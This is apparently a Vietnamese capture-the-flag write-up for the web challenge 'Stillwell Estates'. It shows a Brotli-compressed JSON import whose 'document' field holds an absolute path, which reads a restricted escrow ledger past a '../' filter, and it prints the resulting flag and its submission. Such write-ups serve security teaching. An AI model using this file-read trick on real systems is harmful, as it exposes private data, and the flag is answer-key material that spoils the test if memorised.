---
title: "Stillwell Estates"
category: "Web"
tags: []
solve_date: "2026-11-01"
language: "vi"
---

# Stillwell Estates

## Đề bài

Portal môi giới Stillwell cho phép import dữ liệu đối tác nén Brotli rồi xem trước danh sách bất động sản và tài liệu đính kèm. Cần đọc restricted escrow ledger để tìm closing authorization token.

## Phân tích

“Agent import studio” nhận JSON có format `stillwell.agency-export/1`, nén thành `.br`; frontend cũng cung cấp `sample-export.br`. Trường `document` của mỗi listing được dùng để tạo đường dẫn file ở bước preview.

Bộ đọc chặn chuỗi `../` nhưng vẫn nhận đường dẫn tuyệt đối. Vì vậy file đích có thể nằm ngoài web root mà không cần dùng traversal `..`.

## Lời giải

### 1. Trỏ tài liệu tới ledger

Tạo export có trường `document` là đường dẫn tuyệt đối tới ledger:

```json
{
  "format": "stillwell.agency-export/1",
  "properties": [
    {
      "title": "Meadow House",
      "document": "/tmp/stillwell-private/escrow-ledger.txt"
    }
  ]
}
```

Nén JSON bằng Brotli rồi upload qua trường `feed` của form import. Phần preview trả đoạn nội dung:

```
STILLWELL REALTY - RESTRICTED ESCROW LEDGER
Account: 12-RIVER / Closing desk
Access: closing counsel and designated brokerage principals only

Closing authorization:  hiCTF{s1l3nt_l4n73rn_3573735_f2dc06f8ca}
```

### 2. Giữ đúng byte của token

Hai khoảng trắng sau dấu hai chấm không chỉ là căn lề. Giá trị flag tự nó có **một khoảng trắng đầu**, do `RCTF_FLAG` của deployment được đưa nguyên vẹn vào ledger.

Form submit trên web trim whitespace nên gửi chuỗi nhìn thấy sẽ bị từ chối. Gửi qua API với đúng một khoảng trắng đầu nhận được phản hồi:

```text
candidate repr: ' hiCTF{s1l3nt_l4n73rn_3573735_f2dc06f8ca}'
HTTP 200
{"kind":"goodFlag","message":"The flag is correct."}
```

Response `goodFlag` là bằng chứng chấp nhận đã có trong bản ghi. Không bỏ khoảng trắng khi copy từ block kết quả hoặc khi serialize JSON để submit.

## Kết quả

```
 hiCTF{s1l3nt_l4n73rn_3573735_f2dc06f8ca}
```

Block trên giữ đúng một ký tự space trước `hiCTF`. Phần hậu tố là flag riêng của instance đội; instance khác có thể trả giá trị khác.
